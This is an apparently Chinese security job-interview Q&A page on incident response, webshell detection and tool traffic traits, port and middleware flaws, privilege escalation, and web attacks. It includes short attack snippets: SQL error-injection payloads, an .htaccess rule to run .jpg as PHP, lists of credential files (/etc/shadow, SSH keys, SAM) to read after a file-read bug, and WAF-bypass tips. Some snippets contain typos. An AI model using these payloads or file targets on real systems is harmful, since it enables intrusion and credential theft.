<p>  &lt;2&gt; 历史命令<br>      通过 .bash_history 查看帐号执行过的系统命令<br>      1、root的历史命令 histroy<br>      2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令<br>      <code>history -c</code> 清除历史操作命令(但此命令并不会清除保存在文件中的记录，需要手动删除.bash_profile文件中的记录)</p>
<p>  &lt;3&gt; 检查异常端口<br>    <code>netstat -antlp|more</code><br>    查看下pid所对应的进程文件路径，<br>    运行<code>ls -l /proc/$PID/exe或file /proc/$PID/exe</code>（$PID 为对应的pid 号）</p>
<p>  &lt;4&gt; 检查异常进程<br>   <code> ps aux | grep pid</code></p>
<p>  &lt;5&gt; 检测开机启动项<br>  <code> /etc/rc.local</code><br>    <code>/etc/rc.d/rc[0~6].d</code></p>
<p>  &lt;6&gt; 检查定时任务<br>   <code>crontab -l</code>列出某个用户cron服务的详细内容<br>    Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root<br>   <code>crontab -r </code>删除每个用户cront任务(谨慎：删除所有的计划任务)<br>    <code>crontab -e</code> 使用编辑器编辑当前的crontab文件<br>    如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p>
<p>  &lt;7&gt; 检查服务<br>    <code>chkconfig --list</code> 命令，可以查看系统运行的服务</p>
<h3 id="框架漏洞-amp-常见命令注入漏洞？"><a href="#框架漏洞-amp-常见命令注入漏洞？" class="headerlink" title="框架漏洞&amp;常见命令注入漏洞？"></a>框架漏洞&amp;常见命令注入漏洞？</h3><p>  &lt;1&gt;Struts2 OGNL注入<br>  &lt;2&gt;weblogic<br>  &lt;3&gt;fastjson<br>  &lt;4&gt;TP5 RCE<br>  ……</p>
<h3 id="常见安全工具、设备"><a href="#常见安全工具、设备" class="headerlink" title="常见安全工具、设备"></a>常见安全工具、设备</h3><p>  工具 nmap wireshark Burpsuite Awvs Oneforall CS MSF behind antsword<br>  设备 ？？？ 没接触过</p>
<h3 id="DDOS-CC应急思路以及如何防范"><a href="#DDOS-CC应急思路以及如何防范" class="headerlink" title="DDOS CC应急思路以及如何防范"></a>DDOS CC应急思路以及如何防范</h3><p>  增加硬件设备<br>  上云<br>  购买专业安全公司的安全服务<br>  隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备<br>  过滤不必要的服务端口<br>  使用硬件防火墙<br>  限制特定流量</p>
<h3 id="服务器存在webshell，如何处理？"><a href="#服务器存在webshell，如何处理？" class="headerlink" title="服务器存在webshell，如何处理？"></a>服务器存在webshell，如何处理？</h3><p>  1.使用D盾或者河马(支持多平台，但需要联网)进行查杀<br>  2.事件分析 分析创建时间点的日志<br>  3.漏洞分析 进程分析 样本分析<br>  4.漏洞复现<br>  5.漏洞修复  清除webshell和残留文件；配置必要的防火墙并开启防火墙策略；防止暴露不必要的服务；排查程序存在的漏洞并及时修补</p>
<h3 id="排查shell-应该用什么命令来进行排查"><a href="#排查shell-应该用什么命令来进行排查" class="headerlink" title="排查shell 应该用什么命令来进行排查"></a>排查shell 应该用什么命令来进行排查</h3><p>  find<br>  <code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#39;</code></p>
<h3 id="如何检测webshell"><a href="#如何检测webshell" class="headerlink" title="如何检测webshell"></a>如何检测webshell</h3><p>  &lt;1&gt; 主机层面<br>  静态检查(特征码、危险函数)、动态检查、日志检测<br>  &lt;2&gt; 流量层面<br>  webshell流量特征</p>
<h3 id="Webshell管理工具的流量特征"><a href="#Webshell管理工具的流量特征" class="headerlink" title="Webshell管理工具的流量特征"></a>Webshell管理工具的流量特征</h3><p>  &lt;1&gt;菜刀<br>    只使用url编码+base64编码<br>    shell 特征就是传输参数名为 z0，还存在int_set(“display_erros”,”0”)字符串特征<br>  &lt;2&gt;蚁剑<br>    默认的蚁剑shell连接时会请求两次，其请求体经过url编码<br>    第一次请求  关闭报错和 magic_qoutes 然后去获取主机信息<br>    第二次请求  列出主机目录<br>  &lt;3&gt;冰蝎2.0<br>    使用AES加密发送3次请求<br>    第一次请求  服务端产生密钥写入session， session和当前会话绑定，不同客户端的密钥也不同<br>    第二次请求  获取 key<br>    第三次请求  使用 key的AES加密进行通信<br>  &lt;4&gt;冰蝎3.0<br>    使用AES加密发起2次请求<br>    与2.0相比 少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥<br>    第一次请求  判断是否可以建立连接<br>    第二次请求  发送phpinfo等代码执行，获取网站信息<br>  &lt;5&gt;哥斯拉<br>    支持 n 种加密<br>    采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求<br>    第一次请求  数据超级长，建立 session<br>    第二三次请求确认连接</p>
<h3 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h3><p>  &lt;1&gt;远程管理端口<br>    22ssh(弱口令、暴力破解) 23Telnet(弱口令、明文传输) 3389RDP(暴力破解)<br>  &lt;2&gt;Web中间件/服务端口<br>    1090/1099 RMI     (JAVA反序列化远程RCE)<br>    7001 Weblogic     (弱口令、SSRF、反序列化)<br>    8080 Tomcat       (弱口令)<br>    8080 Jenkin       (未授权访问、命令执行)<br>    9043 WebSphere    (控制台弱口令、远程代码执行)<br>    50070 Hadoop      (未授权访问)<br>  &lt;3&gt;数据库端口<br>    389 Ldap    (弱口令、未授权范围) 使用LdapBrower工具直接炼乳<br>    1433 Mssql  (弱口令、暴力破解)<br>    1521 Oracle (弱口令、暴力破解)<br>    3306 Mysql  (弱口令、暴力破解) 利用日志写入webshell、udf提权、mof提权等<br>    5432 PostgreSQL (弱口令、高权限命令执行)<br>    6379 Redis  (未授权访问)<br>    27017 Mongodb   (未授权访问、弱口令)</p>
<h3 id="挖矿病毒判断-amp-挖矿常见手段-amp-处理"><a href="#挖矿病毒判断-amp-挖矿常见手段-amp-处理" class="headerlink" title="挖矿病毒判断&amp;挖矿常见手段&amp;处理"></a>挖矿病毒判断&amp;挖矿常见手段&amp;处理</h3><p>  怎么发现有没有被攻击，<br>    攻击判断可以建立在设备的基础上，利用设备的告警，<br>    如果没用设备的话可考虑如下<br>      网站被攻击:<br>        网站首页被篡改 网站跳转到别的网站 被植入webshell DDOS\CC攻击<br>      服务器被黑:<br>        服务器中木马病毒 服务器管理员账户密码被改 服务器被远控 服务器被流量攻击</p>
<h3 id="数据包或者日志，你的分析思路是什么"><a href="#数据包或者日志，你的分析思路是什么" class="headerlink" title="数据包或者日志，你的分析思路是什么"></a>数据包或者日志，你的分析思路是什么</h3><p>  分析报文中的host 和 网站目录路径是否可疑<br>  通过威胁平台分析host 是否为恶意IP<br>  使用wireshark 对数据包进行分析<br>  工具 wireshark<br>  网站 微步在线等威胁情报平台</p>
<h3 id="文件上传和命令执行，有看过相关日志吗"><a href="#文件上传和命令执行，有看过相关日志吗" class="headerlink" title="文件上传和命令执行，有看过相关日志吗"></a>文件上传和命令执行，有看过相关日志吗</h3><p>  系统日志  看有没有web容器做了危险行为 反弹shell之类<br>  网络应用日志  查找异常网站文件 webshell</p>
<h3 id="windows日志分析工具"><a href="#windows日志分析工具" class="headerlink" title="windows日志分析工具"></a>windows日志分析工具</h3><p>  Log Parser 、 LOgParse Lizard、Event Log Explorer</p>
<h3 id="Linux日志分析技巧命令"><a href="#Linux日志分析技巧命令" class="headerlink" title="Linux日志分析技巧命令"></a>Linux日志分析技巧命令</h3><p>  grep/awk/sort等命令配合使用</p>
<h3 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h3><p>  时间日期、url 、状态码、UA 缩小范围  然后再去用工具</p>
<h3 id="Windows在应急响应中的安全日志以及对应场景"><a href="#Windows在应急响应中的安全日志以及对应场景" class="headerlink" title="Windows在应急响应中的安全日志以及对应场景"></a>Windows在应急响应中的安全日志以及对应场景</h3><h3 id="设备误报如何处理"><a href="#设备误报如何处理" class="headerlink" title="设备误报如何处理"></a>设备误报如何处理</h3><h3 id="Windows和Linux的日志文件放在哪里"><a href="#Windows和Linux的日志文件放在哪里" class="headerlink" title="Windows和Linux的日志文件放在哪里"></a>Windows和Linux的日志文件放在哪里</h3><p>  Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志<br>    系统日志：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code><br>    应用程序日志：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code><br>    安全日志：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code><br>  Linux<br>    日志默认存放位置：<code>/var/log/</code><br>    查看日志配置情况：<code>more /etc/rsyslog.conf</code></p>
<p> 常见中间件的配置文件路径</p>
<p>  <code>apache：/etc/httpd/conf</code><br>  <code>nginx：/etc/nginx</code><br>  <code>iis7：C:\Windows\System32\inetsrv\config\</code></p>
<h3 id="如何查看系统内存shell"><a href="#如何查看系统内存shell" class="headerlink" title="如何查看系统内存shell"></a>如何查看系统内存shell</h3><h3 id="Java-内存马排查"><a href="#Java-内存马排查" class="headerlink" title="Java 内存马排查"></a>Java 内存马排查</h3><h3 id="如何修改WEB端口？如果不能修改端口还有什么利用方法？"><a href="#如何修改WEB端口？如果不能修改端口还有什么利用方法？" class="headerlink" title="如何修改WEB端口？如果不能修改端口还有什么利用方法？"></a>如何修改WEB端口？如果不能修改端口还有什么利用方法？</h3><h3 id="获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈"><a href="#获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈" class="headerlink" title="获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈"></a>获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">  C:\boot.ini //查看系统版本</span><br><span class="line">  C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">  C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">  C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">  C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">  C:\Windows\php.ini //php配置信息</span><br><span class="line">  C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">  C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux：</span><br><span class="line">  /root/.ssh/authorized_keys</span><br><span class="line">  /root/.ssh/id_rsa</span><br><span class="line">  /root/.ssh/id_ras.keystore</span><br><span class="line">  /root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">  /etc/passwd</span><br><span class="line">  /etc/shadow</span><br><span class="line">  /etc/my.cnf //mysql配置文件</span><br><span class="line">  /etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">  /root/.bash_history //用户历史命令记录文件</span><br><span class="line">  /root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">  /proc/mounts //记录系统挂载设备</span><br><span class="line">  /porc/config.gz //内核配置文件</span><br><span class="line">  /var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">  /porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

<h3 id="windows端口进程间转换"><a href="#windows端口进程间转换" class="headerlink" title="windows端口进程间转换"></a>windows端口进程间转换</h3><p>  netstat -ano | findstr “port”查看目前的网络连接，定位可疑的 ESTABLISHED<br>  根据netstat定位出的 pid，再通过tasklist命令进行进程定位tasklist | findstr “PID”</p>
<h3 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a>文件上传攻击特征？</h3><p>  上传文件的接口  对用户上传文件类型校验不严格</p>
<h3 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a>文件上传加固方法？</h3><p>  后端限制文件上传白名单，头像不允许上传 svg<br>  上传后文件随机重命名，不要输出保存文件位置<br>  图片文件可以二次渲染，使用对象存储 oss<br>  文件目录取消执行权限，PHP 设置 basedir</p>
<h3 id="你还用过其他态势感知的产品吗？"><a href="#你还用过其他态势感知的产品吗？" class="headerlink" title="你还用过其他态势感知的产品吗？"></a>你还用过其他态势感知的产品吗？</h3><p>  ips，ids，hids，堡垒机</p>
<h3 id="钓鱼邮件处置"><a href="#钓鱼邮件处置" class="headerlink" title="钓鱼邮件处置"></a>钓鱼邮件处置</h3><p>  屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问<br>  根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽<br>  对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果<br>  根据钓鱼邮件发件人进行日志回溯</p>
<h3 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h3><p>  扫描数据量大，请求有规律，手动扫描间隔较少</p>
<h3 id="️入侵检测-amp-防御"><a href="#️入侵检测-amp-防御" class="headerlink" title="️入侵检测&amp;防御"></a>️入侵检测&amp;防御</h3><h3 id="WAF产品如何来拦截攻击？"><a href="#WAF产品如何来拦截攻击？" class="headerlink" title="WAF产品如何来拦截攻击？"></a>WAF产品如何来拦截攻击？</h3><p>  云 Waf<br>  Web 防护软件<br>  硬件 Web 防火墙</p>
<h3 id="WAF有哪些防护方式？"><a href="#WAF有哪些防护方式？" class="headerlink" title="WAF有哪些防护方式？"></a>WAF有哪些防护方式？</h3><p>  Web基础防护<br>    可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS 跨站攻击等，可检测 webshell，检查 HTTP 上传通道中的网页木马，打开开关即实时生效<br>  CC 攻击防护<br>    可根据 IP、Cookie 或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击<br>  精准访问防护<br>    对常见 HTTP 字段进行条件组合， 支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性<br>  IP 黑白名单<br>    添加终拦截与始终放行的黑白名单 IP，增加防御准确性<br>  地理位置访问控制<br>    添加地理位置访问控制规则，针对来源 IP 进行自定义访问控制<br>  网页防篡改<br>    对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改<br>  网站反爬虫<br>    动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为<br>  误报屏蔽<br>    针对特定请求忽略某些攻击检测规则，用于处理误报事件<br>  隐私屏蔽<br>    隐私信息屏蔽，避免用户的密码等信息出现在事件日志中<br>  防敏感信息泄露<br>    防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
<h3 id="不安全的第三方组件的漏洞如何做前置规避？"><a href="#不安全的第三方组件的漏洞如何做前置规避？" class="headerlink" title="不安全的第三方组件的漏洞如何做前置规避？"></a>不安全的第三方组件的漏洞如何做前置规避？</h3><h3 id="如果现在要你写一个检测命令注入的脚本？"><a href="#如果现在要你写一个检测命令注入的脚本？" class="headerlink" title="如果现在要你写一个检测命令注入的脚本？"></a>如果现在要你写一个检测命令注入的脚本？</h3><h3 id="️溯源基本步骤"><a href="#️溯源基本步骤" class="headerlink" title="️溯源基本步骤"></a>️溯源基本步骤</h3><p>  &lt;1&gt; 攻击源捕获<br>    安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等<br>    日志与流量分析，异常的通讯流量、攻击源与攻击目标等<br>    服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等<br>    邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等<br>    蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</p>
<p>  &lt;2&gt; 溯源反制手段</p>
<p>  &lt;3&gt; 攻击者画像</p>
<hr>
<h3 id="黄金票据和白银票据的一些区别"><a href="#黄金票据和白银票据的一些区别" class="headerlink" title="黄金票据和白银票据的一些区别"></a>黄金票据和白银票据的一些区别</h3><p>1.访问权限不同<br>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>Silver Ticket: 伪造TGS,只能访问指定的服务<br>2.加密方式不同<br>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密<br>3.认证流程不同<br>Golden Ticket 的利用过程需要访问域控(KDC)<br>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p>
<h3 id="序列化与反序列化的区别"><a href="#序列化与反序列化的区别" class="headerlink" title="序列化与反序列化的区别"></a>序列化与反序列化的区别</h3><p>  序列化: 把对象转换为字符序列的过程  serialize()<br>  反序列化: 把字符序列恢复为对象的过程  unserialize()</p>
<h3 id="常见的中间件漏洞？"><a href="#常见的中间件漏洞？" class="headerlink" title="常见的中间件漏洞？"></a>常见的中间件漏洞？</h3><p>  IIS       put漏洞 文件解析(6.0 /test.asp/test.jpg test.asp;.jpg | 7.5 test.jpg/.php)<br>  Apache    文件解析漏洞(php.xxx.yyy)  目录遍历<br>  Nginx     目录遍历 文件解析漏洞(1.png/.php-&gt; php 配置错误) CRLF注入(\r\n)<br>  Tomcat    war后门部署 远程代码执行<br>  Jboss     反序列化 war后门部署<br>  Weblogic  反序列化 ssrf war后门部署 任意文件上传</p>
<h3 id="蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处"><a href="#蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处" class="headerlink" title="蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处"></a>蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处</h3><p>  &lt;1&gt;菜刀<br>    只使用url编码+base64编码<br>    shell 特征就是传输参数名为 z0，还存在int_set(“display_erros”,”0”)字符串特征<br>  &lt;2&gt;蚁剑<br>    默认的蚁剑shell连接时会请求两次，其请求体经过url编码<br>    第一次请求  关闭报错和 magic_qoutes 然后去获取主机信息<br>    第二次请求  列出主机目录<br>  &lt;3&gt;冰蝎2.0<br>    使用AES加密发送3次请求<br>    第一次请求  服务端产生密钥写入session， session和当前会话绑定，不同客户端的密钥也不同<br>    第二次请求  获取 key<br>    第三次请求  使用 key的AES加密进行通信<br>  &lt;4&gt;冰蝎3.0<br>    使用AES加密发起2次请求<br>    与2.0相比 少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥<br>    第一次请求  判断是否可以建立连接<br>    第二次请求  发送phpinfo等代码执行，获取网站信息<br>  &lt;5&gt;哥斯拉<br>    支持 n 种加密<br>    采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求<br>    第一次请求  数据超级长，建立 session<br>    第二三次请求确认连接</p>
<h3 id="正向-SHELL-和反向-SHELL-的区别"><a href="#正向-SHELL-和反向-SHELL-的区别" class="headerlink" title="正向 SHELL 和反向 SHELL 的区别"></a>正向 SHELL 和反向 SHELL 的区别</h3><p>  攻击机(kali) 受害者(win7)为例<br>  正向 kali 主动连win7<br>  反向 kali 监听端口 win7发起请求连接该端口</p>
<h3 id="Windows-常用的提权方法"><a href="#Windows-常用的提权方法" class="headerlink" title="Windows 常用的提权方法"></a>Windows 常用的提权方法</h3><p>  potato<br>  udf<br>  systeminfo 提权辅助页<br>  ms15-051<br>  ms14-067<br>  令牌窃取</p>
<h3 id="Linux-提权有哪些方法"><a href="#Linux-提权有哪些方法" class="headerlink" title="Linux 提权有哪些方法"></a>Linux 提权有哪些方法</h3><p>  suid<br>  sudo<br>  第三方服务<br>  内核</p>
<p>  Linux DirtyPipe本地提权 CVE-2022-0847<br>  Linux Polkit权限提升漏洞 CVE-2021-4034<br>  Linux sudo权限提升漏洞 CVE-2021-3156<br>  Linux kernel权限提升漏洞 CVE-2021-3493</p>
<h3 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h3><h3 id="为何一个-MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#为何一个-MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="为何一个 MYSQL 数据库的站，只有一个 80 端口开放？"></a>为何一个 MYSQL 数据库的站，只有一个 80 端口开放？</h3><p>  更改了端口<br>  站库分离<br>  3306不对外开放</p>
<h3 id="一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？"><a href="#一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？" class="headerlink" title="一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？"></a>一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？</h3><h3 id="在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>在某后台新闻编辑界面看到编辑器，应该先做什么？</h3><p>  查看编辑器版本名称 找之前爆出的对应漏洞</p>
<h3 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title="审查上传点的元素有什么意义？"></a>审查上传点的元素有什么意义？</h3><p>  如果站点文件上传类型限制是在前端实现的，那么增加上传类型就可以绕过</p>
<h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><p>  XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、输出时采用html实体编码。<br>  CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>  XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<h3 id="3389-无法连接的几种情况"><a href="#3389-无法连接的几种情况" class="headerlink" title="3389 无法连接的几种情况"></a>3389 无法连接的几种情况</h3><p>  没开放3389端口<br>  端口被修改<br>  处于内网(需要端口转发)<br>  防护拦截</p>
<h3 id="目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？"><a href="#目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？" class="headerlink" title="目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？"></a>目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？</h3><h3 id="目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h3><p>  先爆破用户名 </p>
<h3 id="如何突破注入时字符被转义？"><a href="#如何突破注入时字符被转义？" class="headerlink" title="如何突破注入时字符被转义？"></a>如何突破注入时字符被转义？</h3><p>  宽字节注入<br>  hex编码</p>
<h3 id="拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？"><a href="#拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？" class="headerlink" title="拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？"></a>拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</h3><p>  <code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code><br>  .jpg文件会被解析成.php文件</p>
<h3 id="安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="安全狗会追踪变量，从而发现出是一句话木马吗？"></a>安全狗会追踪变量，从而发现出是一句话木马吗？</h3><h3 id="提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="提权时选择可读写目录，为何尽量不用带空格的目录？"></a>提权时选择可读写目录，为何尽量不用带空格的目录？</h3><h3 id="如何利用这个防注入系统拿-shell？"><a href="#如何利用这个防注入系统拿-shell？" class="headerlink" title="如何利用这个防注入系统拿 shell？"></a>如何利用这个防注入系统拿 shell？</h3><h3 id="CSRF、SSRF-和重放攻击有什么区别？"><a href="#CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF 和重放攻击有什么区别？"></a>CSRF、SSRF 和重放攻击有什么区别？</h3><p>  CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
<h3 id="nmap扫描的几种方式"><a href="#nmap扫描的几种方式" class="headerlink" title="nmap扫描的几种方式"></a>nmap扫描的几种方式</h3><p>  sT  TCP扫描<br>  sU  UDP扫描<br>  sP  ping扫描<br>  Pn  禁ping扫描<br>  sS  半开放扫描<br>  F   快速扫描</p>
<h3 id="报错注入的函数有哪些？"><a href="#报错注入的函数有哪些？" class="headerlink" title="报错注入的函数有哪些？"></a>报错注入的函数有哪些？</h3><p>  10个<br>  <code>extractvalue(1, concat(0x7e,(select @@version),0x7e))</code><br>  <code>updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</code><br> <code>exp()select from test where id=1 and exp(~(select * from(select user())a));</code><br>  floor报错向下取整<br>  …</p>
<h3 id="延时注入如何来判断？"><a href="#延时注入如何来判断？" class="headerlink" title="延时注入如何来判断？"></a>延时注入如何来判断？</h3><p>  sleep() benchmark()</p>
<h3 id="sql-注入写文件都有哪些函数？"><a href="#sql-注入写文件都有哪些函数？" class="headerlink" title="sql 注入写文件都有哪些函数？"></a>sql 注入写文件都有哪些函数？</h3><p>  into outfile<br>  into dumpfile</p>
<h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title="php中命令执行涉及到的函数"></a>php中命令执行涉及到的函数</h3><p>  eval()、assert()、popen()、system()、exec()、shell_exec()、passthru()、pcntl_exec()等函数</p>
<h3 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title="宽字节注入产生原理以及根本原因"></a>宽字节注入产生原理以及根本原因</h3><p>  在PHP中比如addslash和magic_quotes_gpc开启</p>
<h3 id="如何防止-CSRF"><a href="#如何防止-CSRF" class="headerlink" title="如何防止 CSRF?"></a>如何防止 CSRF?</h3><p>  验证Referer<br>  添加token</p>
<h3 id="代码执行，文件读取，命令执行的函数都有哪些？"><a href="#代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="代码执行，文件读取，命令执行的函数都有哪些？"></a>代码执行，文件读取，命令执行的函数都有哪些？</h3><p>  1，代码执行：<br>  eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>  2，文件读取：<br>  file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>  3，命令执行：<br>  system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h3 id="img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h3><p>  src指定一个远程的脚本文件，获取referer</p>
<h3 id="img-标签除了-onerror-属性外，并且-src-属性的后缀名，必须以-jpg-结尾，怎么获取管理员路径。"><a href="#img-标签除了-onerror-属性外，并且-src-属性的后缀名，必须以-jpg-结尾，怎么获取管理员路径。" class="headerlink" title="img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。"></a>img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。</h3><p>  远程服务器修改apache配置文件<br>  配置.jpg文件以php方式来解析<code>AddType application/x-httpd-php .jpg</code><br>  <code>&lt;img src=http://xss.tv/1.jpg&gt;</code> 会以php方式来解析</p>
<h3 id="为什么-aspx-木马权限比-asp-大？"><a href="#为什么-aspx-木马权限比-asp-大？" class="headerlink" title="为什么 aspx 木马权限比 asp 大？"></a>为什么 aspx 木马权限比 asp 大？</h3><p>  aspx使用的是.net技术。 IIS 中默认不支持，ASP只是脚本语言而已。<br>  入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
<h3 id="如何绕过-waf？"><a href="#如何绕过-waf？" class="headerlink" title="如何绕过 waf？"></a>如何绕过 waf？</h3><p>  大小写<br>  内敛注释<br>  换行符<br>  编码<br>  参数污染</p>
<h3 id="文件上传有哪些防护方式"><a href="#文件上传有哪些防护方式" class="headerlink" title="文件上传有哪些防护方式"></a>文件上传有哪些防护方式</h3><p>  文件上传的目录设置为不可执行<br>  白名单机制<br>  重命名<br>  使用安全设备防御</p>
<h3 id="注入有防护怎么办"><a href="#注入有防护怎么办" class="headerlink" title="注入有防护怎么办"></a>注入有防护怎么办</h3><p>  绕waf</p>
<h3 id="ddos-如何防护"><a href="#ddos-如何防护" class="headerlink" title="ddos 如何防护"></a>ddos 如何防护</h3><p>  SYN cookie(为每个ip分配一个”cookie”)<br>  统计ip访问频率 banip<br>  使用安全设备</p>
